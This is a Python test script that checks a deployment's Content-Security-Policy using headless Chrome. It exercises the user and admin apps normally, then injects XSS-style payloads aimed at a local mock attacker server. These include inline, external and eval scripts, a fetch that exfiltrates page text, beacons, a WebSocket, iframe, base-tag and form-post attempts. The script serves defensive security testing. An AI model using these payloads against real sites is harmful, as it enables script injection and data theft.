"""Browser check of the Content-Security-Policy in deploy/Caddyfile: a REAL headless Chrome (DevTools protocol) against the apps served the way production serves them
(Caddy + HTTPS + the real Caddyfile). Two parts:
  A. NORMAL USE of the user app and the admin dashboard (sign in, pages, a video + logo preview from blob: URLs, ...): the browser must report ZERO
     "Refused to ..." policy violations (a CSP that is too tight breaks the apps).
  B. INJECTION: from inside the signed-in page, run what an XSS payload would try (inline script, external script, eval, onerror handler, fetch / image /
     beacon / WebSocket / form / iframe / stylesheet / base-tag to an attacker's HTTPS server). Every one must be blocked, the attacker's server must
     receive NOTHING, and the browser must have reported the violations (so it was the policy that stopped them, not luck).
Setup (see deploy/README.md for the real thing): the apps built with VITE_API_BASE=https://localhost:8083, Caddy serving them with deploy/Caddyfile on
https://localhost:8081 (app), :8082 (admin), :8083 (API proxy), a backend behind it. Run from backend/ with:
    APP_URL=https://localhost:8081 ADMIN_URL=https://localhost:8082 INSECURE_TLS=1 \\
    CHECK_USER_EMAIL=... CHECK_USER_PW=... CHECK_ADMIN_EMAIL=... CHECK_ADMIN_PW=... python browser_check_csp.py
INSECURE_TLS=1 accepts Caddy's local test certificates. Exit code 0 = every check passed."""
import datetime
import http.server
import json
import os
import ssl
import subprocess
import sys
import tempfile
import threading
import time
import urllib.request

from websockets.sync.client import connect

CHROME = os.environ.get("CHROME", r"C:\Program Files\Google\Chrome\Application\chrome.exe")
APP = os.environ.get("APP_URL", "https://localhost:8081").rstrip("/")
ADMIN = os.environ.get("ADMIN_URL", "https://localhost:8082").rstrip("/")
USER = (os.environ["CHECK_USER_EMAIL"], os.environ["CHECK_USER_PW"])
ADMIN_ACC = (os.environ["CHECK_ADMIN_EMAIL"], os.environ["CHECK_ADMIN_PW"])
PORT = 9334
results = []


def check(cond, msg):
    results.append(bool(cond))
    print(("PASS " if cond else "FAIL ") + msg, flush=True)


# ---------------- the attacker: an HTTPS server that counts every request ----------------
def make_cert(directory):
    from cryptography import x509
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.x509.oid import NameOID
    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "127.0.0.1")])
    now = datetime.datetime.now(datetime.timezone.utc)
    cert = (x509.CertificateBuilder().subject_name(name).issuer_name(name).public_key(key.public_key()).serial_number(x509.random_serial_number())
            .not_valid_before(now - datetime.timedelta(days=1)).not_valid_after(now + datetime.timedelta(days=2))
            .add_extension(x509.SubjectAlternativeName([x509.IPAddress(__import__("ipaddress").ip_address("127.0.0.1"))]), critical=False).sign(key, hashes.SHA256()))
    cert_path, key_path = os.path.join(directory, "c.pem"), os.path.join(directory, "k.pem")
    open(cert_path, "wb").write(cert.public_bytes(serialization.Encoding.PEM))
    open(key_path, "wb").write(key.private_bytes(serialization.Encoding.PEM, serialization.PrivateFormat.TraditionalOpenSSL, serialization.NoEncryption()))
    return cert_path, key_path


hits = []


class Attacker(http.server.BaseHTTPRequestHandler):
    def _go(self):
        hits.append(self.path)
        body = b"window.__pwned_external = 1;"
        self.send_response(200)
        self.send_header("Content-Type", "application/javascript")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    do_GET = do_POST = do_HEAD = _go

    def log_message(self, *a):
        pass


workdir = tempfile.mkdtemp(prefix="csp-check-")
cert_path, key_path = make_cert(workdir)
srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Attacker)
ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
ctx.load_cert_chain(cert_path, key_path)
srv.socket = ctx.wrap_socket(srv.socket, server_side=True)
threading.Thread(target=srv.serve_forever, daemon=True).start()
ATTACKER = f"https://127.0.0.1:{srv.server_address[1]}"

# ---------------- test files for the upload preview ----------------
video = os.path.join(workdir, "clip.webm")
logo = os.path.join(workdir, "logo.png")
subprocess.run(["ffmpeg", "-y", "-loglevel", "error", "-f", "lavfi", "-i", "testsrc=s=320x240:d=2:r=10", "-c:v", "libvpx", "-b:v", "200k", video], check=True)
subprocess.run(["ffmpeg", "-y", "-loglevel", "error", "-f", "lavfi", "-i", "color=c=red:s=64x64", "-frames:v", "1", logo], check=True)

flags = ["--headless=new", f"--remote-debugging-port={PORT}", f"--user-data-dir={os.path.join(workdir, 'profile')}", "--no-first-run", "--no-default-browser-check",
         "--disable-gpu", "--disable-extensions", "--window-size=1280,900"]
if os.environ.get("INSECURE_TLS") == "1":
    flags.append("--ignore-certificate-errors")
proc = subprocess.Popen([CHROME, *flags, "about:blank"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
violations = []
try:
    for _ in range(40):
        try:
            tabs = json.load(urllib.request.urlopen(f"http://127.0.0.1:{PORT}/json"))
            page = next(t for t in tabs if t["type"] == "page")
            break
        except Exception:
            time.sleep(0.5)
    ws = connect(page["webSocketDebuggerUrl"], max_size=None)
    seq = [0]

    def note(msg):
        if msg.get("method") == "Log.entryAdded":
            text = msg["params"]["entry"].get("text", "")
            if "Content Security Policy" in text or "Refused to" in text:
                violations.append(text)
        elif msg.get("method") == "Runtime.exceptionThrown":
            text = json.dumps(msg["params"].get("exceptionDetails", {}))
            if "Content Security Policy" in text:
                violations.append(text[:300])

    def call(method, params=None):
        seq[0] += 1
        ws.send(json.dumps({"id": seq[0], "method": method, "params": params or {}}))
        while True:
            msg = json.loads(ws.recv(timeout=60))
            if msg.get("id") == seq[0]:
                if "error" in msg:
                    raise RuntimeError(msg["error"])
                return msg["result"]
            note(msg)

    def pump(seconds=0.6):
        end = time.time() + seconds
        while time.time() < end:
            try:
                note(json.loads(ws.recv(timeout=0.2)))
            except Exception:
                pass

    def js(expr):
        r = call("Runtime.evaluate", {"expression": expr, "awaitPromise": True, "returnByValue": True, "allowUnsafeEvalBlockedByCSP": False})
        if "exceptionDetails" in r:
            return {"__error__": r["exceptionDetails"].get("exception", {}).get("description", "error")}
        return r["result"].get("value")

    def wait(expr, timeout=25):
        end = time.time() + timeout
        while time.time() < end:
            try:
                if js(expr):
                    return True
            except Exception:
                pass
            pump(0.4)
        return False

    def go(url):
        call("Page.navigate", {"url": url})
        pump(1.2)

    def sign_in(email, password):
        assert wait("!!document.querySelector('input[type=password]')"), "login form did not appear"
        js("""(() => { const set = (el, v) => { Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, 'value').set.call(el, v); el.dispatchEvent(new Event('input', {bubbles: true})); };
          set(document.querySelector('input[type=email]'), %s); set(document.querySelector('input[type=password]'), %s); document.querySelector('form').requestSubmit(); return true })()"""
           % (json.dumps(email), json.dumps(password)))

    def set_file(index, path):
        doc = call("DOM.getDocument", {"depth": 0})["root"]["nodeId"]
        nodes = call("DOM.querySelectorAll", {"nodeId": doc, "selector": "input[type=file]"})["nodeIds"]
        call("DOM.setFileInputFiles", {"files": [path], "nodeId": nodes[index]})

    for domain in ("Log", "Runtime", "Page", "DOM", "Network"):
        call(f"{domain}.enable")

    # ======================= A. NORMAL USE =======================
    go(APP + "/")
    check(wait("!!document.querySelector('input[type=password]')"), "user app: the sign-in screen renders under the policy")
    _ctx = ssl.create_default_context()
    _ctx.check_hostname, _ctx.verify_mode = False, ssl.CERT_NONE
    _resp = urllib.request.urlopen(APP + "/", context=_ctx)
    hdr = {"csp": _resp.headers.get("content-security-policy"), "hsts": _resp.headers.get("strict-transport-security"), "nosniff": _resp.headers.get("x-content-type-options")}
    check("script-src 'self'" in (hdr["csp"] or "") and "connect-src" in hdr["csp"] and hdr["hsts"] and hdr["nosniff"] == "nosniff", f"the page is served with the CSP, HSTS and nosniff ({(hdr['csp'] or '')[:60]}...)")
    sign_in(*USER)
    check(wait("!document.querySelector('input[type=password]') && document.body.innerText.length > 100", 40), "user app: signed in (API calls pass connect-src)")
    pump(2.0)
    cookie = next((c for c in call("Network.getAllCookies")["cookies"] if c["name"] == "session"), None)
    check(cookie and cookie["httpOnly"] and cookie["secure"] and cookie["sameSite"] == "Strict", f"over HTTPS the session cookie is HttpOnly + Secure + SameSite=Strict ({cookie and (cookie['httpOnly'], cookie['secure'], cookie['sameSite'])})")
    kinds = js("[...document.querySelectorAll('input[type=file]')].map(i => i.accept)")
    video_i = next((i for i, a in enumerate(kinds or []) if "video" in a), 0)
    logo_i = next((i for i, a in enumerate(kinds or []) if "image" in a), 1)
    set_file(video_i, video)
    check(wait("(() => { const v = document.querySelector('video'); return !!v && v.src.startsWith('blob:') && v.readyState >= 1 && v.videoWidth > 0 })()", 20), "user app: the chosen video previews from a blob: URL (media-src blob:)")
    try:
        set_file(logo_i, logo)
        pump(1.5)
        check(js("[...document.querySelectorAll('img')].some(i => i.src.startsWith('blob:') && i.naturalWidth > 0)"), "user app: the chosen logo previews from a blob: URL (img-src blob:)")
    except Exception as exc:
        check(False, f"logo preview could not be exercised: {exc}")
    clicked = js("""(() => { const b = [...document.querySelectorAll('aside button, nav button, header button')].find(x => /usage|မှတ်တမ်း|အသုံး/i.test(x.innerText)); if (b) { b.click(); return true } return false })()""")
    pump(2.0)
    check(clicked, "user app: opened the 'My usage' page")
    check(len(violations) == 0, f"user app, normal use: {len(violations)} policy violations" + (f" -> {violations[:3]}" if violations else ""))

    # ======================= admin dashboard =======================
    go(ADMIN + "/")
    sign_in(*ADMIN_ACC)
    check(wait("!document.querySelector('input[type=password]') && document.body.innerText.length > 100", 40), "admin app: signed in under the policy")
    pump(1.5)
    n = js("document.querySelectorAll('aside button, nav button, aside a, nav a').length") or 0
    for i in range(int(n)):
        js(f"(() => {{ const e = [...document.querySelectorAll('aside button, nav button, aside a, nav a')][{i}]; if (e && !/log ?out|ထွက်|open app|အက်ပ်/i.test(e.innerText)) e.click() }})()")
        pump(1.3)
    check(n >= 4, f"admin app: visited {n} navigation entries (overview, users, jobs, voice models, settings, audit ...)")
    check(len(violations) == 0, f"admin app, normal use: {len(violations)} policy violations (cumulative)" + (f" -> {violations[:3]}" if violations else ""))
    normal_violations = len(violations)

    # ======================= B. INJECTION =======================
    go(APP + "/")
    wait("!document.querySelector('input[type=password]') && document.body.innerText.length > 100", 30)
    pump(1.0)
    # CONTROL: the same page, same origin, same network position, with ONLY the policy switched off (DevTools "bypass CSP"). The attacks must then WORK,
    # otherwise "the attacker received nothing" would prove nothing (the browser could be blocking the loopback server for other reasons).
    call("Page.setBypassCSP", {"enabled": True})
    go(APP + "/")
    wait("!document.querySelector('input[type=password]') && document.body.innerText.length > 100", 30)
    pump(1.0)
    before = len(hits)
    js(f"(() => {{ const s = document.createElement('script'); s.src = '{ATTACKER}/evil.js'; document.body.appendChild(s); return true }})()")
    js(f"fetch('{ATTACKER}/control-fetch', {{mode: 'no-cors'}}).then(() => 'ok').catch(() => 'fail')")
    js(f"new Promise(res => {{ const i = new Image(); i.onload = i.onerror = () => res('done'); i.src = '{ATTACKER}/control.png' }})")
    js("(() => { const s = document.createElement('script'); s.textContent = 'window.__pwned_inline = 1'; document.body.appendChild(s); return true })()")
    js("eval('window.__pwned_eval = 1')")
    pump(1.5)
    got = js("({inline: window.__pwned_inline, external: window.__pwned_external, eval: window.__pwned_eval})")
    check(len(hits) - before >= 3, f"CONTROL (policy switched off): the attacker's server DOES receive the requests ({len(hits) - before} of 3: script, fetch, image)")
    check(got == {"inline": 1, "external": 1, "eval": 1}, f"CONTROL (policy switched off): injected inline / external / eval code DOES run ({got})")
    call("Page.setBypassCSP", {"enabled": False})
    go(APP + "/")
    wait("!document.querySelector('input[type=password]') && document.body.innerText.length > 100", 30)
    pump(1.0)
    js("delete window.__pwned_inline; delete window.__pwned_external; delete window.__pwned_eval")
    base_hits, base_viol = len(hits), len(violations)

    attacks = {
        "inline <script> injected into the page": "(() => { const s = document.createElement('script'); s.textContent = 'window.__pwned_inline = 1'; document.body.appendChild(s); return window.__pwned_inline === undefined })()",
        "external <script src> from the attacker": f"(() => {{ const s = document.createElement('script'); s.src = '{ATTACKER}/evil.js'; document.body.appendChild(s); return true }})()",
        "eval()": "(() => { try { eval('window.__pwned_eval = 1'); return window.__pwned_eval === undefined } catch (e) { return true } })()",
        "new Function()": "(() => { try { new Function('window.__pwned_fn = 1')(); return window.__pwned_fn === undefined } catch (e) { return true } })()",
        "inline event handler (<img onerror>)": "(() => { const d = document.createElement('div'); d.innerHTML = '<img src=\"/nope.png\" onerror=\"window.__pwned_onerror = 1\">'; document.body.appendChild(d); return true })()",
        "javascript: link click": "(() => { const a = document.createElement('a'); a.href = 'javascript:window.__pwned_js = 1'; document.body.appendChild(a); a.click(); return true })()",
        "fetch() to the attacker (exfiltrate the page / cookie text)": f"fetch('{ATTACKER}/steal?d=' + encodeURIComponent(document.body.innerText.slice(0, 200)), {{mode: 'no-cors'}}).then(() => 'sent').catch(() => 'blocked')",
        "image beacon to the attacker": f"new Promise(res => {{ const i = new Image(); i.onload = () => res('loaded'); i.onerror = () => res('blocked'); i.src = '{ATTACKER}/p.png?d=1' }})",
        "navigator.sendBeacon to the attacker": f"navigator.sendBeacon('{ATTACKER}/beacon', 'data')",
        "WebSocket to the attacker": f"new Promise(res => {{ try {{ const w = new WebSocket('{ATTACKER.replace('https', 'wss')}/ws'); w.onopen = () => res('open'); w.onerror = () => res('blocked') }} catch (e) {{ res('blocked') }} }})",
        "stylesheet from the attacker": f"(() => {{ const l = document.createElement('link'); l.rel = 'stylesheet'; l.href = '{ATTACKER}/x.css'; document.head.appendChild(l); return true }})()",
        "iframe of the attacker's page": f"(() => {{ const f = document.createElement('iframe'); f.src = '{ATTACKER}/frame'; document.body.appendChild(f); return true }})()",
        "<base href> hijack": f"(() => {{ const b = document.createElement('base'); b.href = '{ATTACKER}/'; document.head.appendChild(b); return document.baseURI.startsWith(location.origin) }})()",
        "<object data> from the attacker": f"(() => {{ const o = document.createElement('object'); o.data = '{ATTACKER}/o'; document.body.appendChild(o); return true }})()",
        "<form> posting the page to the attacker": f"(() => {{ const f = document.createElement('form'); f.method = 'POST'; f.action = '{ATTACKER}/form'; document.body.appendChild(f); f.submit(); return location.origin }})()",
    }
    for name, expr in attacks.items():
        res = js(expr)
        pump(0.8)
    pump(1.5)
    flags_set = js("({inline: window.__pwned_inline, external: window.__pwned_external, eval: window.__pwned_eval, fn: window.__pwned_fn, onerror: window.__pwned_onerror, js: window.__pwned_js})")
    check(all(v is None for v in (flags_set or {}).values()), f"none of the injected code ran (inline / external / eval / Function / onerror / javascript: all stay undefined: {flags_set})")
    check(len(hits) == base_hits, f"the attacker's server received {len(hits) - base_hits} requests during {len(attacks)} attempts (exfiltration by fetch, image, beacon, WebSocket, stylesheet, iframe, object, form, script)")
    check(js("location.origin") == APP, "the page was not navigated away by the form / javascript: link")
    new_viol = violations[base_viol:]
    check(len(new_viol) >= 10, f"the browser reported {len(new_viol)} policy violations for the attempts (the policy, not luck, stopped them)")
    for d in ("script-src", "connect-src", "img-src", "frame-src", "form-action", "base-uri", "style-src", "object-src"):
        check(any(d in v for v in new_viol) or d == "frame-src" and any("default-src" in v or "frame" in v for v in new_viol),
              f"... including a {d} violation")
finally:
    try:
        ws.close()
    except Exception:
        pass
    proc.terminate()
    srv.shutdown()

print(f"\n{sum(results)} of {len(results)} CSP checks passed")
sys.exit(0 if all(results) else 1)
